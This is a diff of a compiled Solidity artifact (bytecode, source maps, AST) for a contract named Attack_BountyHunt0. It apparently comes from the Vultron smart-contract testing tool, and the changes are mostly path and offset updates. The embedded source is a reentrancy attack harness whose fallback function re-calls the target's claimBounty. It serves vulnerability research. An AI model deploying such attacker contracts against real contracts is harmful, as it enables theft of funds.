@@ -81,14 +81,14 @@
       "type": "function"
     }
   ],
-  "bytecode": "0x608060405260405160208061052e83398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506104b8806100766000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063574ffc31146101015780635da9026014610158578063639dd8f31461016f578063fb6e918b146101b9575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ee4be2886040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b50505050005b34801561010d57600080fd5b50610116610206565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561016457600080fd5b5061016d61022b565b005b6101b760048036038101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506102ca565b005b3480156101c557600080fd5b50610204600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506103ac565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ee4be2886040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156102b057600080fd5b505af11580156102c4573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ab6b7e228484846040518463ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506000604051808303818588803b15801561038e57600080fd5b505af11580156103a2573d6000803e3d6000fd5b5050505050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632f7442bb83836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b15801561047057600080fd5b505af1158015610484573d6000803e3d6000fd5b5050505050505600a165627a7a72305820f940458d71f4c09c295c29d183582e758c0be3fde1462d9250c3aa5b4aeacb7b0029",
-  "deployedBytecode": "0x608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063574ffc31146101015780635da9026014610158578063639dd8f31461016f578063fb6e918b146101b9575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ee4be2886040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b50505050005b34801561010d57600080fd5b50610116610206565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561016457600080fd5b5061016d61022b565b005b6101b760048036038101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506102ca565b005b3480156101c557600080fd5b50610204600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506103ac565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ee4be2886040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156102b057600080fd5b505af11580156102c4573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ab6b7e228484846040518463ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506000604051808303818588803b15801561038e57600080fd5b505af11580156103a2573d6000803e3d6000fd5b5050505050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632f7442bb83836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b15801561047057600080fd5b505af1158015610484573d6000803e3d6000fd5b5050505050505600a165627a7a72305820f940458d71f4c09c295c29d183582e758c0be3fde1462d9250c3aa5b4aeacb7b0029",
-  "sourceMap": "84:693:0:-;;;155:126;;;;;;;;;;;;;;;;;;;;;;;;;;;;260:15;231;;:45;;;;;;;;;;;;;;;;;;155:126;84:693;;;;;;",
-  "deployedSourceMap": "84:693:0:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;731:15;;;;;;;;;;;:27;;;:29;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;731:29:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;731:29:0;;;;84:693;117:33;;8:9:-1;5:2;;;30:1;27;20:12;5:2;117:33:0;;;;;;;;;;;;;;;;;;;;;;;;;;;286:78;;8:9:-1;5:2;;;30:1;27;20:12;5:2;286:78:0;;;;;;492:185;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;369:118;;8:9:-1;5:2;;;30:1;27;20:12;5:2;369:118:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;117:33;;;;;;;;;;;;;:::o;286:78::-;330:15;;;;;;;;;;;:27;;;:29;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;330:29:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;330:29:0;;;;286:78::o;492:185::-;602:15;;;;;;;;;;;:27;;;636:14;652:11;665:6;602:70;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;602:70:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;602:70:0;;;;;492:185;;;:::o;369:118::-;441:15;;;;;;;;;;;:30;;;472:2;476:5;441:41;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;441:41:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;441:41:0;;;;369:118;;:::o",
-  "source": "pragma solidity ^0.4.19;\n\nimport \"/home/osboxes/vultron/contracts/BountyHunt.sol\";\n\ncontract Attack_BountyHunt0 {\n\n  BountyHunt public target_contract;\n\n  function Attack_BountyHunt0(address _targetContract) public payable {\n      target_contract = BountyHunt(_targetContract);\n  } \n\n  function vultron_claimBounty() public {\n    target_contract.claimBounty();\n  } \n\n  function vultron_transferBounty(address to, uint256 value) public {\n    target_contract.transferBounty(to, value);\n  } \n\n  function vultron_grantBounty(uint256 vultron_amount, address beneficiary, uint256 amount) public payable{\n    target_contract.grantBounty.value(vultron_amount)(beneficiary, amount);\n  } \n\n      function() public payable {\n        \n        target_contract.claimBounty();\n      }\n      } \n",
-  "sourcePath": "/home/osboxes/vultron/contracts/Attack_BountyHunt0.sol",
+  "bytecode": "0x608060405260405160208061052e83398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506104b8806100766000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063574ffc31146101015780635da9026014610158578063639dd8f31461016f578063fb6e918b146101b9575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ee4be2886040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b50505050005b34801561010d57600080fd5b50610116610206565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561016457600080fd5b5061016d61022b565b005b6101b760048036038101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506102ca565b005b3480156101c557600080fd5b50610204600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506103ac565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ee4be2886040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156102b057600080fd5b505af11580156102c4573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ab6b7e228484846040518463ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506000604051808303818588803b15801561038e57600080fd5b505af11580156103a2573d6000803e3d6000fd5b5050505050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632f7442bb83836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b15801561047057600080fd5b505af1158015610484573d6000803e3d6000fd5b5050505050505600a165627a7a72305820b3256e9100c266907d733d4b6669082111ec056aadc349196063f9b6462f3fe40029",
+  "deployedBytecode": "0x608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063574ffc31146101015780635da9026014610158578063639dd8f31461016f578063fb6e918b146101b9575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ee4be2886040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b50505050005b34801561010d57600080fd5b50610116610206565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561016457600080fd5b5061016d61022b565b005b6101b760048036038101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506102ca565b005b3480156101c557600080fd5b50610204600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506103ac565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ee4be2886040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156102b057600080fd5b505af11580156102c4573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ab6b7e228484846040518463ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506000604051808303818588803b15801561038e57600080fd5b505af11580156103a2573d6000803e3d6000fd5b5050505050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632f7442bb83836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b15801561047057600080fd5b505af1158015610484573d6000803e3d6000fd5b5050505050505600a165627a7a72305820b3256e9100c266907d733d4b6669082111ec056aadc349196063f9b6462f3fe40029",
+  "sourceMap": "89:693:0:-;;;160:126;;;;;;;;;;;;;;;;;;;;;;;;;;;;265:15;236;;:45;;;;;;;;;;;;;;;;;;160:126;89:693;;;;;;",
+  "deployedSourceMap": "89:693:0:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;736:15;;;;;;;;;;;:27;;;:29;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;736:29:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;736:29:0;;;;89:693;122:33;;8:9:-1;5:2;;;30:1;27;20:12;5:2;122:33:0;;;;;;;;;;;;;;;;;;;;;;;;;;;291:78;;8:9:-1;5:2;;;30:1;27;20:12;5:2;291:78:0;;;;;;497:185;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;374:118;;8:9:-1;5:2;;;30:1;27;20:12;5:2;374:118:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;122:33;;;;;;;;;;;;;:::o;291:78::-;335:15;;;;;;;;;;;:27;;;:29;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;335:29:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;335:29:0;;;;291:78::o;497:185::-;607:15;;;;;;;;;;;:27;;;641:14;657:11;670:6;607:70;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;607:70:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;607:70:0;;;;;497:185;;;:::o;374:118::-;446:15;;;;;;;;;;;:30;;;477:2;481:5;446:41;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;446:41:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;446:41:0;;;;374:118;;:::o",
+  "source": "pragma solidity ^0.4.19;\n\nimport \"/home/liuye/Webank/vultron/contracts/BountyHunt.sol\";\n\ncontract Attack_BountyHunt0 {\n\n  BountyHunt public target_contract;\n\n  function Attack_BountyHunt0(address _targetContract) public payable {\n      target_contract = BountyHunt(_targetContract);\n  } \n\n  function vultron_claimBounty() public {\n    target_contract.claimBounty();\n  } \n\n  function vultron_transferBounty(address to, uint256 value) public {\n    target_contract.transferBounty(to, value);\n  } \n\n  function vultron_grantBounty(uint256 vultron_amount, address beneficiary, uint256 amount) public payable{\n    target_contract.grantBounty.value(vultron_amount)(beneficiary, amount);\n  } \n\n      function() public payable {\n        \n        target_contract.claimBounty();\n      }\n      } \n",
+  "sourcePath": "/home/liuye/Webank/vultron/contracts/Attack_BountyHunt0.sol",
   "ast": {
-    "absolutePath": "/home/osboxes/vultron/contracts/Attack_BountyHunt0.sol",
+    "absolutePath": "/home/liuye/Webank/vultron/contracts/Attack_BountyHunt0.sol",
     "exportedSymbols": {
       "Attack_BountyHunt0": [
         71
@@ -109,13 +109,13 @@
         "src": "0:24:0"
       },
       {
-        "absolutePath": "/home/osboxes/vultron/contracts/BountyHunt.sol",
-        "file": "/home/osboxes/vultron/contracts/BountyHunt.sol",
+        "absolutePath": "/home/liuye/Webank/vultron/contracts/BountyHunt.sol",
+        "file": "/home/liuye/Webank/vultron/contracts/BountyHunt.sol",
         "id": 2,
         "nodeType": "ImportDirective",
         "scope": 72,
         "sourceUnit": 1521,
-        "src": "26:56:0",
+        "src": "26:61:0",
         "symbolAliases": [],
         "unitAlias": ""
       },
@@ -138,7 +138,7 @@
             "name": "target_contract",
             "nodeType": "VariableDeclaration",
             "scope": 71,
-            "src": "117:33:0",
+            "src": "122:33:0",
             "stateVariable": true,
             "storageLocation": "default",
             "typeDescriptions": {
@@ -151,7 +151,7 @@
               "name": "BountyHunt",
               "nodeType": "UserDefinedTypeName",
               "referencedDeclaration": 1520,
-              "src": "117:10:0",
+              "src": "122:10:0",
               "typeDescriptions": {
                 "typeIdentifier": "t_contract$_BountyHunt_$1520",
                 "typeString": "contract BountyHunt"
@@ -164,7 +164,7 @@
             "body": {
               "id": 15,
               "nodeType": "Block",
-              "src": "223:58:0",
+              "src": "228:58:0",
               "statements": [
                 {
                   "expression": {
@@ -181,7 +181,7 @@
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [],
                       "referencedDeclaration": 4,
-                      "src": "231:15:0",
+                      "src": "236:15:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_contract$_BountyHunt_$1520",
                         "typeString": "contract BountyHunt"
@@ -199,7 +199,7 @@
                           "nodeType": "Identifier",
                           "overloadedDeclarations": [],
                           "referencedDeclaration": 6,
-                          "src": "260:15:0",
+                          "src": "265:15:0",
                           "typeDescriptions": {
                             "typeIdentifier": "t_address",
                             "typeString": "address"
@@ -218,7 +218,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 1520,
-                        "src": "249:10:0",
+                        "src": "254:10:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_type$_t_contract$_BountyHunt_$1520_$",
                           "typeString": "type(contract BountyHunt)"
@@ -232,13 +232,13 @@
                       "lValueRequested": false,
                       "names": [],
                       "nodeType": "FunctionCall",
-                      "src": "249:27:0",
+                      "src": "254:27:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_contract$_BountyHunt_$1520",
                         "typeString": "contract BountyHunt"
                       }
                     },
-                    "src": "231:45:0",
+                    "src": "236:45:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_contract$_BountyHunt_$1520",
                       "typeString": "contract BountyHunt"
@@ -246,7 +246,7 @@
                   },
                   "id": 14,
                   "nodeType": "ExpressionStatement",
-                  "src": "231:45:0"
+                  "src": "236:45:0"
                 }
               ]
             },
@@ -268,7 +268,7 @@
                   "name": "_targetContract",
                   "nodeType": "VariableDeclaration",
                   "scope": 16,
-                  "src": "183:23:0",
+                  "src": "188:23:0",
                   "stateVariable": false,
                   "storageLocation": "default",
                   "typeDescriptions": {
@@ -279,7 +279,7 @@
                     "id": 5,
                     "name": "address",
                     "nodeType": "ElementaryTypeName",
-                    "src": "183:7:0",
+                    "src": "188:7:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_address",
                       "typeString": "address"
@@ -289,17 +289,17 @@
                   "visibility": "internal"
                 }
               ],
-              "src": "182:25:0"
+              "src": "187:25:0"
             },
             "payable": true,
             "returnParameters": {
               "id": 8,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "223:0:0"
+              "src": "228:0:0"
             },
             "scope": 71,
-            "src": "155:126:0",
+            "src": "160:126:0",
             "stateMutability": "payable",
             "superFunction": null,
             "visibility": "public"
@@ -308,7 +308,7 @@
             "body": {
               "id": 24,
               "nodeType": "Block",
-              "src": "324:40:0",
+              "src": "329:40:0",
               "statements": [
                 {
                   "expression": {
@@ -323,7 +323,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 4,
-                        "src": "330:15:0",
+                        "src": "335:15:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_contract$_BountyHunt_$1520",
                           "typeString": "contract BountyHunt"
@@ -337,7 +337,7 @@
                       "memberName": "claimBounty",
                       "nodeType": "MemberAccess",
                       "referencedDeclaration": 1488,
-                      "src": "330:27:0",
+                      "src": "335:27:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                         "typeString": "function () external"
@@ -351,7 +351,7 @@
                     "lValueRequested": false,
                     "names": [],
                     "nodeType": "FunctionCall",
-                    "src": "330:29:0",
+                    "src": "335:29:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_tuple$__$",
                       "typeString": "tuple()"
@@ -359,7 +359,7 @@
                   },
                   "id": 23,
                   "nodeType": "ExpressionStatement",
-                  "src": "330:29:0"
+                  "src": "335:29:0"
                 }
               ]
             },
@@ -375,17 +375,17 @@
               "id": 17,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "314:2:0"
+              "src": "319:2:0"
             },
             "payable": false,
             "returnParameters": {
               "id": 18,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "324:0:0"
+              "src": "329:0:0"
             },
             "scope": 71,
-            "src": "286:78:0",
+            "src": "291:78:0",
             "stateMutability": "nonpayable",
             "superFunction": null,
             "visibility": "public"
@@ -394,7 +394,7 @@
             "body": {
               "id": 39,
               "nodeType": "Block",
-              "src": "435:52:0",
+              "src": "440:52:0",
               "statements": [
                 {
                   "expression": {
@@ -407,7 +407,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 27,
-                        "src": "472:2:0",
+                        "src": "477:2:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_address",
                           "typeString": "address"
@@ -420,7 +420,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 29,
-                        "src": "476:5:0",
+                        "src": "481:5:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_uint256",
                           "typeString": "uint256"
@@ -445,7 +445,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 4,
-                        "src": "441:15:0",
+                        "src": "446:15:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_contract$_BountyHunt_$1520",
                           "typeString": "contract BountyHunt"
@@ -459,7 +459,7 @@
                       "memberName": "transferBounty",
                       "nodeType": "MemberAccess",
                       "referencedDeclaration": 1519,
-                      "src": "441:30:0",
+                      "src": "446:30:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$__$",
                         "typeString": "function (address,uint256) external"
@@ -473,7 +473,7 @@
                     "lValueRequested": false,
                     "names": [],
                     "nodeType": "FunctionCall",
-                    "src": "441:41:0",
+                    "src": "446:41:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_tuple$__$",
                       "typeString": "tuple()"
@@ -481,7 +481,7 @@
                   },
                   "id": 38,
                   "nodeType": "ExpressionStatement",
-                  "src": "441:41:0"
+                  "src": "446:41:0"
                 }
               ]
             },
@@ -503,7 +503,7 @@
                   "name": "to",
                   "nodeType": "VariableDeclaration",
                   "scope": 40,
-                  "src": "401:10:0",
+                  "src": "406:10:0",
                   "stateVariable": false,
                   "storageLocation": "default",
                   "typeDescriptions": {
@@ -514,7 +514,7 @@
                     "id": 26,
                     "name": "address",
                     "nodeType": "ElementaryTypeName",
-                    "src": "401:7:0",
+                    "src": "406:7:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_address",
                       "typeString": "address"
@@ -529,7 +529,7 @@
                   "name": "value",
                   "nodeType": "VariableDeclaration",
                   "scope": 40,
-                  "src": "413:13:0",
+                  "src": "418:13:0",
                   "stateVariable": false,
                   "storageLocation": "default",
                   "typeDescriptions": {
@@ -540,7 +540,7 @@
                     "id": 28,
                     "name": "uint256",
                     "nodeType": "ElementaryTypeName",
-                    "src": "413:7:0",
+                    "src": "418:7:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_uint256",
                       "typeString": "uint256"
@@ -550,17 +550,17 @@
                   "visibility": "internal"
                 }
               ],
-              "src": "400:27:0"
+              "src": "405:27:0"
             },
             "payable": false,
             "returnParameters": {
               "id": 31,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "435:0:0"
+              "src": "440:0:0"
             },
             "scope": 71,
-            "src": "369:118:0",
+            "src": "374:118:0",
             "stateMutability": "nonpayable",
             "superFunction": null,
             "visibility": "public"
@@ -569,7 +569,7 @@
             "body": {
               "id": 60,
               "nodeType": "Block",
-              "src": "596:81:0",
+              "src": "601:81:0",
               "statements": [
                 {
                   "expression": {
@@ -582,7 +582,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 44,
-                        "src": "652:11:0",
+                        "src": "657:11:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_address",
                           "typeString": "address"
@@ -595,7 +595,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 46,
-                        "src": "665:6:0",
+                        "src": "670:6:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_uint256",
                           "typeString": "uint256"
@@ -621,7 +621,7 @@
                           "nodeType": "Identifier",
                           "overloadedDeclarations": [],
                           "referencedDeclaration": 42,
-                          "src": "636:14:0",
+                          "src": "641:14:0",
                           "typeDescriptions": {
                             "typeIdentifier": "t_uint256",
                             "typeString": "uint256"
@@ -644,7 +644,7 @@
                             "nodeType": "Identifier",
                             "overloadedDeclarations": [],
                             "referencedDeclaration": 4,
-                            "src": "602:15:0",
+                            "src": "607:15:0",
                             "typeDescriptions": {
                               "typeIdentifier": "t_contract$_BountyHunt_$1520",
                               "typeString": "contract BountyHunt"
@@ -658,7 +658,7 @@
                           "memberName": "grantBounty",
                           "nodeType": "MemberAccess",
                           "referencedDeclaration": 1455,
-                          "src": "602:27:0",
+                          "src": "607:27:0",
                           "typeDescriptions": {
                             "typeIdentifier": "t_function_external_payable$_t_address_$_t_uint256_$returns$__$",
                             "typeString": "function (address,uint256) payable external"
@@ -672,7 +672,7 @@
                         "memberName": "value",
                         "nodeType": "MemberAccess",
                         "referencedDeclaration": null,
-                        "src": "602:33:0",
+                        "src": "607:33:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_function_setvalue_nonpayable$_t_uint256_$returns$_t_function_external_payable$_t_address_$_t_uint256_$returns$__$value_$",
                           "typeString": "function (uint256) returns (function (address,uint256) payable external)"
@@ -686,7 +686,7 @@
                       "lValueRequested": false,
                       "names": [],
                       "nodeType": "FunctionCall",
-                      "src": "602:49:0",
+                      "src": "607:49:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_payable$_t_address_$_t_uint256_$returns$__$value",
                         "typeString": "function (address,uint256) payable external"
@@ -700,7 +700,7 @@
                     "lValueRequested": false,
                     "names": [],
                     "nodeType": "FunctionCall",
-                    "src": "602:70:0",
+                    "src": "607:70:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_tuple$__$",
                       "typeString": "tuple()"
@@ -708,7 +708,7 @@
                   },
                   "id": 59,
                   "nodeType": "ExpressionStatement",
-                  "src": "602:70:0"
+                  "src": "607:70:0"
                 }
               ]
             },
@@ -730,7 +730,7 @@
                   "name": "vultron_amount",
                   "nodeType": "VariableDeclaration",
                   "scope": 61,
-                  "src": "521:22:0",
+                  "src": "526:22:0",
                   "stateVariable": false,
                   "storageLocation": "default",
                   "typeDescriptions": {
@@ -741,7 +741,7 @@
                     "id": 41,
                     "name": "uint256",
                     "nodeType": "ElementaryTypeName",
-                    "src": "521:7:0",
+                    "src": "526:7:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_uint256",
                       "typeString": "uint256"
@@ -756,7 +756,7 @@
                   "name": "beneficiary",
                   "nodeType": "VariableDeclaration",
                   "scope": 61,
-                  "src": "545:19:0",
+                  "src": "550:19:0",
                   "stateVariable": false,
                   "storageLocation": "default",
                   "typeDescriptions": {
@@ -767,7 +767,7 @@
                     "id": 43,
                     "name": "address",
                     "nodeType": "ElementaryTypeName",
-                    "src": "545:7:0",
+                    "src": "550:7:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_address",
                       "typeString": "address"
@@ -782,7 +782,7 @@
                   "name": "amount",
                   "nodeType": "VariableDeclaration",
                   "scope": 61,
-                  "src": "566:14:0",
+                  "src": "571:14:0",
                   "stateVariable": false,
                   "storageLocation": "default",
                   "typeDescriptions": {
@@ -793,7 +793,7 @@
                     "id": 45,
                     "name": "uint256",
                     "nodeType": "ElementaryTypeName",
-                    "src": "566:7:0",
+                    "src": "571:7:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_uint256",
                       "typeString": "uint256"
@@ -803,17 +803,17 @@
                   "visibility": "internal"
                 }
               ],
-              "src": "520:61:0"
+              "src": "525:61:0"
             },
             "payable": true,
             "returnParameters": {
               "id": 48,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "596:0:0"
+              "src": "601:0:0"
             },
             "scope": 71,
-            "src": "492:185:0",
+            "src": "497:185:0",
             "stateMutability": "payable",
             "superFunction": null,
             "visibility": "public"
@@ -822,7 +822,7 @@
             "body": {
               "id": 69,
               "nodeType": "Block",
-              "src": "712:57:0",
+              "src": "717:57:0",
               "statements": [
                 {
                   "expression": {
@@ -837,7 +837,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 4,
-                        "src": "731:15:0",
+                        "src": "736:15:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_contract$_BountyHunt_$1520",
                           "typeString": "contract BountyHunt"
@@ -851,7 +851,7 @@
                       "memberName": "claimBounty",
                       "nodeType": "MemberAccess",
                       "referencedDeclaration": 1488,
-                      "src": "731:27:0",
+                      "src": "736:27:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                         "typeString": "function () external"
@@ -865,7 +865,7 @@
                     "lValueRequested": false,
                     "names": [],
                     "nodeType": "FunctionCall",
-                    "src": "731:29:0",
+                    "src": "736:29:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_tuple$__$",
                       "typeString": "tuple()"
@@ -873,7 +873,7 @@
                   },
                   "id": 68,
                   "nodeType": "ExpressionStatement",
-                  "src": "731:29:0"
+                  "src": "736:29:0"
                 }
               ]
             },
@@ -889,30 +889,30 @@
               "id": 62,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "694:2:0"
